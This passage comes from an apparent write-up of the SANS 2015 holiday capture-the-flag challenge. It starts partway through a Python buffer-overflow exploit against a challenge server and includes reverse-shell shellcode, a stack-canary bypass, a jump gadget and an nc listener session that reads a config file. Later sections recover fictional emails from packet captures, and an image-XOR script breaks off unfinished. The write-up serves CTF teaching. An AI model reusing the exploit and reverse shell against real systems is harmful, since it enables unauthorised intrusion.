    &lt;span class="n"&gt;shellcode&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="se"&gt;\x6a\x02\x59\x87\xda\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;
    &lt;span class="n"&gt;shellcode&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="se"&gt;\x41\x89\xca\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;
    &lt;span class="n"&gt;shellcode&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="se"&gt;\x89\xe3\xcd\x80&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;

    &lt;span class="n"&gt;payload&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="se"&gt;\x90&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="mi"&gt;104&lt;/span&gt; &lt;span class="c1"&gt;# padding to overwrite the saved value of eip&lt;/span&gt;
    &lt;span class="n"&gt;payload&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="se"&gt;\xe4\xff\xff\xe4&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt; &lt;span class="c1"&gt;# canary stack&lt;/span&gt;
    &lt;span class="n"&gt;payload&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="se"&gt;\x6b\x93\x04\x08&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt; &lt;span class="c1"&gt;# address of our &amp;#39;jump esp&amp;#39; gadget&lt;/span&gt;
    &lt;span class="n"&gt;payload&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="se"&gt;\x6b\x93\x04\x08&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;
    &lt;span class="n"&gt;payload&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="n"&gt;shellcode&lt;/span&gt;
    &lt;span class="n"&gt;payload&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="se"&gt;\x90&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;200&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;payload&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="c1"&gt;# padding to get a length of 200 bytes&lt;/span&gt;

    &lt;span class="c1"&gt;# We connect to our distant server&lt;/span&gt;
    &lt;span class="n"&gt;sock&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
    &lt;span class="n"&gt;sock&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;settimeout&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mf"&gt;0.5&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;sock&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;connect&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;54.233.105.81&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;4242&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;

    &lt;span class="c1"&gt;# We receive all the data we can&lt;/span&gt;
    &lt;span class="k"&gt;try&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="n"&gt;sock&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;recv&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;4096&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;except&lt;/span&gt; &lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;timeout&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="k"&gt;pass&lt;/span&gt;

    &lt;span class="c1"&gt;# We enter the secret command&lt;/span&gt;
    &lt;span class="n"&gt;sock&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;send&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;X&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="c1"&gt;# We receive all the data we can&lt;/span&gt;
    &lt;span class="k"&gt;try&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;xrange&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;7&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
            &lt;span class="n"&gt;sock&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;recv&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;4096&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;
    &lt;span class="k"&gt;except&lt;/span&gt; &lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;timeout&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="k"&gt;pass&lt;/span&gt;

    &lt;span class="c1"&gt;# We send our payload&lt;/span&gt;
    &lt;span class="n"&gt;sock&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;send&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;payload&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;

&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="vm"&gt;__name__&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;__main__&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="n"&gt;main&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;We launch our exploit:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; ./exploit_sg05.py
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;And in another terminal, on the server I own:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; nc -lvp &lt;span class="m"&gt;8080&lt;/span&gt;
&lt;span class="go"&gt;listening on [any] 8080 ...&lt;/span&gt;
&lt;span class="go"&gt;connect to [192.168.XX.XX] from ec2-54-233-105-81.sa-east-1.compute.amazonaws.com [54.233.105.81] 42021&lt;/span&gt;
&lt;span class="go"&gt;cat /gnome/www/files/gnome.conf&lt;/span&gt;
&lt;span class="go"&gt;Gnome Serial Number: 4CKL3R43V4&lt;/span&gt;
&lt;span class="go"&gt;Current config file: ./tmp/e31faee/cfg/sg.01.v1339.cfg&lt;/span&gt;
&lt;span class="go"&gt;Allow new subordinates?: YES&lt;/span&gt;
&lt;span class="go"&gt;Camera monitoring?: YES&lt;/span&gt;
&lt;span class="go"&gt;Audio monitoring?: YES&lt;/span&gt;
&lt;span class="go"&gt;Camera update rate: 60min&lt;/span&gt;
&lt;span class="go"&gt;Gnome mode: SuperGnome&lt;/span&gt;
&lt;span class="go"&gt;Gnome name: SG-05&lt;/span&gt;
&lt;span class="go"&gt;Allow file uploads?: YES&lt;/span&gt;
&lt;span class="go"&gt;Allowed file formats: .png&lt;/span&gt;
&lt;span class="go"&gt;Allowed file size: 512kb&lt;/span&gt;
&lt;span class="go"&gt;Files directory: /gnome/www/files/&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The flag for this SuperGnome is &lt;code&gt;4CKL3R43V4&lt;/code&gt;
(&lt;a class="reference external" href="http://www.sou.edu/cs/lynnackler.html"&gt;geeky reference&lt;/a&gt;).&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="part-5-baby-its-gnome-outside-sinister-plot-and-attribution"&gt;
&lt;h2&gt;&lt;a class="toc-backref" href="#id15"&gt;Part 5: Baby, It’s Gnome Outside: &lt;em&gt;Sinister Plot and Attribution&lt;/em&gt;&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;We can see on the SuperGnomes some capture files, inside ZIP archives. We can
also see from a conversation on the GnomeNET on the SuperGnomes that someone
has a problem with the pictures taken by the gnomes: if some gnomes have the
same name, the uploaded images get scrambled together (the RGB pixels are
XORed with one another):&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Welcome to GnomeNET.&lt;/p&gt;
&lt;p&gt;I noticed an issue when there are multiple child-gnomes with the same name.
The image feeds become scrambled together. Any way to resolve this other
than rename the gnomes?? ~DW&lt;/p&gt;
&lt;p&gt;Can you provide an example of the scrambling you're seeing? ~PS&lt;/p&gt;
&lt;p&gt;I uploaded 'camera_feed_overlap_error.png' to SG-01. We have six factory
test cameras all named the same. The issue occurs only when they have the
same name. It occurs even if the cameras are not transmitting an image. ~PS&lt;/p&gt;
&lt;p&gt;Oh, also, in the image, 5 of the cameras are just transmitting the 'camera
disabled' static, the 6th one was in the boss' office. The door was locked
and the boss seemed busy, so I didn't mess with that one. ~PS&lt;/p&gt;
&lt;p&gt;To help me troubleshoot this, can you grab a still from all six cameras at
the same time? Also, is this really an issue? ~DW&lt;/p&gt;
&lt;p&gt;I grabbed a still from 5 of the 6 cameras, again, staying out of the boss'
office! Each cam is directed to a different SG, so each SG has one of the
5 stills I manually snagged. I named them 'factory_cam_#.png' and pushed
them up to the files menu. 'camera_feed_overlap_error.png' has that garbled
image. Oh, and to answer your question. Yes. We have almost 2 million
cameras... some of them WILL be named the same. Just fix it. ~PS&lt;/p&gt;
&lt;p&gt;Took a look at your issue. It looks like the camera feed collector only
cares about the name and will merge the feeds. Looks like each pixel is
XORed... Its going to be a lot of work to fix this. We are too late in
the game to push a new update to all the cameras... stop naming cameras
the same name. ~DW&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;So we have six images: five from some gnomes and one from the boss' office.
By recovering the five images and XORing them with the sixth image, we can
see an image from the boss' office!&lt;/p&gt;
&lt;p&gt;By using the vulnerabilities from Part 4, we can recover the capture file
and the images.&lt;/p&gt;
&lt;p&gt;You can download the capture files here:&lt;/p&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;&lt;a class="reference external" href="/docs/sans-christmas-challenge-2015/20141226101055_1.pcap"&gt;First capture file&lt;/a&gt;
(sha256: &lt;code&gt;a15a537562a4c828bf9eebd09f8f99686df76a4854a741a2df63902a023a1cea&lt;/code&gt;)&lt;/li&gt;
&lt;li&gt;&lt;a class="reference external" href="/docs/sans-christmas-challenge-2015/20150225093040_2.pcap"&gt;Second capture file&lt;/a&gt;
(sha256: &lt;code&gt;d4481450877d1468fba6c038f2a2c7b72eaab80540dda07fcc28b0a63045bd0c&lt;/code&gt;)&lt;/li&gt;
&lt;li&gt;&lt;a class="reference external" href="/docs/sans-christmas-challenge-2015/20151201113358_3.pcap"&gt;Third capture file&lt;/a&gt;
(sha256: &lt;code&gt;f12950e677cfa1646c1c616a62d063497cf0d2cc9cea3a0167ad302a02b682c8&lt;/code&gt;)&lt;/li&gt;
&lt;li&gt;&lt;a class="reference external" href="/docs/sans-christmas-challenge-2015/20151203133818_4.pcap"&gt;Fourth capture file&lt;/a&gt;
(sha256: &lt;code&gt;45f076467bdd69d4855d21726f398f246b7179e499fde663b4f6c7e77ba39025&lt;/code&gt;)&lt;/li&gt;
&lt;li&gt;&lt;a class="reference external" href="/docs/sans-christmas-challenge-2015/20151215161015_5.pcap"&gt;Fifth capture file&lt;/a&gt;
(sha256: &lt;code&gt;5a637e03e9a2ea4b4fde5437eabd281d2e78c6b383a31f0e705dd9da2ec6c12a&lt;/code&gt;)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;You can download the images here:&lt;/p&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;&lt;a class="reference external" href="/images/sans-christmas-challenge-2015/factory_cam_1.png"&gt;First factory image&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference external" href="/images/sans-christmas-challenge-2015/factory_cam_2.png"&gt;Second factory image&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference external" href="/images/sans-christmas-challenge-2015/factory_cam_3.png"&gt;Third factory image&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference external" href="/images/sans-christmas-challenge-2015/factory_cam_4.png"&gt;Fourth factory image&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference external" href="/images/sans-christmas-challenge-2015/factory_cam_5.png"&gt;Fifth factory image&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference external" href="/images/sans-christmas-challenge-2015/camera_feed_overlap_error.png"&gt;Camera overlay image&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Let's look at the capture files first. By opening them with Wireshark,
we can see some SMTP and IMAP traffic.By using the wonderful
&amp;quot;Follow TCP Stream&amp;quot; functionnality, we can recover the full traffic.&lt;/p&gt;
&lt;div class="section" id="first-capture-file"&gt;
&lt;h3&gt;&lt;a class="toc-backref" href="#id16"&gt;First capture file&lt;/a&gt;&lt;/h3&gt;
&lt;pre class="literal-block"&gt;
From: &amp;quot;c&amp;quot; &amp;lt;c&amp;#64;atnascorp.com&amp;gt;
To: &amp;lt;jojo&amp;#64;atnascorp.com&amp;gt;
Subject: GiYH Architecture
Date: Fri, 26 Dec 2014 10:10:55 -0500

JoJo,

As you know, I hired you because you are the best architect in town for a
distributed surveillance system to satisfy our rather unique business
requirements.  We have less than a year from today to get our final plans in
place.  Our schedule is aggressive, but realistic.

I've sketched out the overall Gnome in Your Home architecture in the diagram
attached below.  Please add in protocol details and other technical
specifications to complete the architectural plans.

Remember: to achieve our goal, we must have the infrastructure scale to
upwards of 2 million Gnomes.  Once we solidify the architecture, you'll work
with the hardware team to create device specs and we'll start procuring
hardware in the February 2015 timeframe.

I've also made significant progress on distribution deals with retailers.

Thoughts?

Looking forward to working with you on this project!

-C
&lt;/pre&gt;
&lt;p&gt;Attached to this email is this image:&lt;/p&gt;
&lt;img alt="giyh_architecture.jpg" class="align-center" src="/images/sans-christmas-challenge-2015/giyh_architecture.jpg" /&gt;
&lt;/div&gt;
&lt;div class="section" id="second-capture-file"&gt;
&lt;h3&gt;&lt;a class="toc-backref" href="#id17"&gt;Second capture file&lt;/a&gt;&lt;/h3&gt;
&lt;pre class="literal-block"&gt;
From: &amp;quot;c&amp;quot; &amp;lt;c&amp;#64;atnascorp.com&amp;gt;
To: &amp;lt;supplier&amp;#64;ginormouselectronicssupplier.com&amp;gt;
Subject: Large Order - Immediate Attention Required
Date: Wed, 25 Feb 2015 09:30:39 -0500

Maratha,

As a follow-up to our phone conversation, we'd like to proceed with an order
of parts for our upcoming product line.  We'll need two million of each of
the following components:

* Ambarella S2Lm IP Camera Processor System-on-Chip (with an ARM Cortex A9
  CPU and Linux SDK)
* ON Semiconductor AR0330: 3 MP 1/3&amp;quot; CMOS Digital Image Sensor
* Atheros AR6233X Wi-Fi adapter
* Texas Instruments TPS65053 switching power supply
* Samsung K4B2G16460 2GB SSDR3 SDRAM
* Samsung K9F1G08U0D 1GB NAND Flash

Given the volume of this purchase, we fully expect the 35% discount you
mentioned during our phone discussion.  If you cannot agree to this pricing,
we'll place our order elsewhere.

We need delivery of components to begin no later than April 1, 2015, with
250,000 units coming each week, with all of them arriving no later than June
1, 2015.


Finally, as you know, this project requires the utmost secrecy.   Tell NO
ONE about our order, especially any nosy law enforcement authorities.

Regards,

-CW
&lt;/pre&gt;
&lt;/div&gt;
&lt;div class="section" id="third-capture-file"&gt;
&lt;h3&gt;&lt;a class="toc-backref" href="#id18"&gt;Third capture file&lt;/a&gt;&lt;/h3&gt;
&lt;pre class="literal-block"&gt;
From: &amp;quot;c&amp;quot; &amp;lt;c&amp;#64;atnascorp.com&amp;gt;
To: &amp;lt;burglerlackeys&amp;#64;atnascorp.com&amp;gt;
Subject: All Systems Go for Dec 24, 2015
Date: Tue, 1 Dec 2015 11:33:56 -0500

My Burgling Friends,

Our long-running plan is nearly complete, and I'm writing to share the date
when your thieving will commence!  On the morning of December 24, 2015, each
individual burglar on this email list will receive a detailed itinerary of
specific houses and an inventory of items to steal from each house, along
with still photos of where to locate each item.  The message will also
include a specific path optimized for you to hit your assigned houses
quickly and efficiently the night of December 24, 2015 after dark.

Further, we've selected the items to steal based on a detailed analysis of
what commands the highest prices on the hot-items open market.  I caution
you - steal only the items included on the list.  DO NOT waste time grabbing
anything else from a house.  There's no sense whatsoever grabbing crumbs too
small for a mouse!

As to the details of the plan, remember to wear the Santa suit we provided
you, and bring the extra large bag for all your stolen goods.

If any children observe you in their houses that night, remember to tell
them that you are actually &amp;quot;Santy Claus&amp;quot;, and that you need to send the
specific items you are taking to your workshop for repair.  Describe it in a
very friendly manner, get the child a drink of water, pat him or her on the
head, and send the little moppet back to bed.  Then, finish the deed, and
get out of there.  It's all quite simple - go to each house, grab the loot,
and return it to the designated drop-off area so we can resell it.  And,
above all, avoid Mount Crumpit!

As we agreed, we'll split the proceeds from our sale 50-50 with each
burglar.

Oh, and I've heard that many of you are asking where the name ATNAS comes
from.  Why, it's reverse SANTA, of course.  Instead of bringing presents on
Christmas, we'll be stealing them!

Thank you for your partnership in this endeavor.

Signed:

-CLW

President and CEO of ATNAS Corporation
&lt;/pre&gt;
&lt;/div&gt;
&lt;div class="section" id="fourth-capture-file"&gt;
&lt;h3&gt;&lt;a class="toc-backref" href="#id19"&gt;Fourth capture file&lt;/a&gt;&lt;/h3&gt;
&lt;pre class="literal-block"&gt;
From: &amp;quot;c&amp;quot; &amp;lt;c&amp;#64;atnascorp.com&amp;gt;
To: &amp;lt;psychdoctor&amp;#64;whovillepsychiatrists.com&amp;gt;
Subject: Answer To Your Question
Date: Thu, 3 Dec 2015 13:38:15 -0500

Dr. O'Malley,

In your recent email, you inquired:

&amp;gt; When did you first notice your anxiety about the holiday season?

Anxiety is hardly the word for it.  It's a deep-seated hatred, Doctor.

Before I get into details, please allow me to remind you that we operate
under the strictest doctor-patient confidentiality agreement in the
business.  I have some very powerful lawyers whom I'd hate to invoke in the
event of some leak on your part.  I seek your help because you are the best
psychiatrist in all of Who-ville.

To answer your question directly, as a young child (I must have been no more
than two), I experienced a life-changing interaction.  Very late on
Christmas Eve, I was awakened to find a grotesque green Who dressed in a
tattered Santa Claus outfit, standing in my barren living room, attempting
to shove our holiday tree up the chimney.  My senses heightened, I put on my
best little-girl innocent voice and asked him what he was doing.  He
explained that he was &amp;quot;Santy Claus&amp;quot; and needed to send the tree for repair.
I instantly knew it was a lie, but I humored the old thief so I could escape
to the safety of my bed.  That horrifying interaction ruined Christmas for
me that year, and I was terrified of the whole holiday season throughout my
teen years.

I later learned that the green Who was known as &amp;quot;the Grinch&amp;quot; and had lost
his mind in the middle of a crime spree to steal Christmas presents.  At the
very moment of his criminal triumph, he had a pitiful change of heart and
started playing all nicey-nice.  What an amateur!  When I became an adult,
my fear of Christmas boiled into true hatred of the whole holiday season.  I
knew that I had to stop Christmas from coming.  But how?

I vowed to finish what the Grinch had started, but to do it at a far larger
scale.  Using the latest technology and a distributed channel of burglars,
we'd rob 2 million houses, grabbing their most precious gifts, and selling
them on the open market.  We'll destroy Christmas as two million homes full
of people all cry &amp;quot;BOO-HOO&amp;quot;, and we'll turn a handy profit on the whole
deal.

Is this &amp;quot;wrong&amp;quot;?  I simply don't care.  I bear the bitter scars of the
Grinch's malfeasance, and singing a little &amp;quot;Fahoo Fores&amp;quot; isn't gonna fix
that!

What is your advice, doctor?

Signed,

Cindy Lou Who
&lt;/pre&gt;
&lt;/div&gt;
&lt;div class="section" id="fifth-capture-file"&gt;
&lt;h3&gt;&lt;a class="toc-backref" href="#id20"&gt;Fifth capture file&lt;/a&gt;&lt;/h3&gt;
&lt;pre class="literal-block"&gt;
From: &amp;quot;Grinch&amp;quot; &amp;lt;grinch&amp;#64;who-villeisp.com&amp;gt;
To: &amp;lt;c&amp;#64;atnascorp.com&amp;gt;
Subject: My Apologies &amp;amp; Holiday Greetings
Date: Tue, 15 Dec 2015 16:09:40 -0500

Dear Cindy Lou,

I am writing to apologize for what I did to you so long ago.  I wronged you
and all the Whos down in Who-ville due to my extreme misunderstanding of
Christmas and a deep-seated hatred.  I should have never lied to you, and I
should have never stolen those gifts on Christmas Eve.  I realize that even
returning them on Christmas morn didn't erase my crimes completely.  I seek
your forgiveness.

You see, on Mount Crumpit that fateful Christmas morning, I learned th[4 bytes missing in capture file]at
Christmas doesn't come from a store.  In fact, I discovered that Christmas
means a whole lot more!

When I returned their gifts, the Whos embraced me.  They forgave.  I was
stunned, and my heart grew even more.  Why, they even let me carve the roast
beast!  They demonstrated to me that the holiday season is, in part, about
forgiveness and love, and that's the gift that all the Whos gave to me that
morning so long ago.  I honestly tear up thinking about it.

I don't expect you to forgive me, Cindy Lou.  But, you have my deepest and
most sincere apologies.

And, above all, don't let my horrible actions from so long ago taint you in
any way.  I understand you've grown into an amazing business leader.  You
are a precious and beautiful Who, my dear.  Please use your skills wisely
and to help and support your fellow Who, especially during the holidays.

I sincerely wish you a holiday season full of kindness and warmth,

--The Grinch
&lt;/pre&gt;
&lt;/div&gt;
&lt;div class="section" id="let-s-unxor-the-images"&gt;
&lt;h3&gt;&lt;a class="toc-backref" href="#id21"&gt;Let's unXOR the images&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;With a simple Python script, we can take every image and XOR the RGB pixels
to recover the image from the boss' office:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="ch"&gt;#!/usr/bin/env python&lt;/span&gt;

&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;sys&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;PIL&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;Image&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
    &lt;span class="c1"&gt;# We open the camera feed overlap image&lt;/span&gt;
    &lt;span class="n"&gt;scrambled_image&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Image&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;6&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;convert&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;RGB&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;scrambled_image_pixels&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;scrambled_image&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;load&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
    &lt;span class="n"&gt;width&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;height&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;scrambled_image&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;size&lt;/span&gt;

    &lt;span class="c1"&gt;# For every image found in one of the SuperGnomes&lt;/span&gt;
    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;image&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;6&lt;/span&gt;&lt;span class="p"&gt;]:&lt;/span&gt;
        &lt;span class="n"&gt;image_pixels&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Image&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;image&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;convert&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;RGB&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;load&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
        &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;xrange&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;width&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
            &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;j&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;xrange&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;height&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
                &lt;span class="c1"&gt;# We take the RGB components&lt;/span&gt;
                &lt;span class="n"&gt;r1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;g1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;b1&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;scrambled_image_pixels&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
                &lt;span class="n"&gt;r2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;g2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;b2&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;image_pixels&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
                &lt;span class="c1"&gt;# And we XOR them to recover the original value&lt;/span&gt;
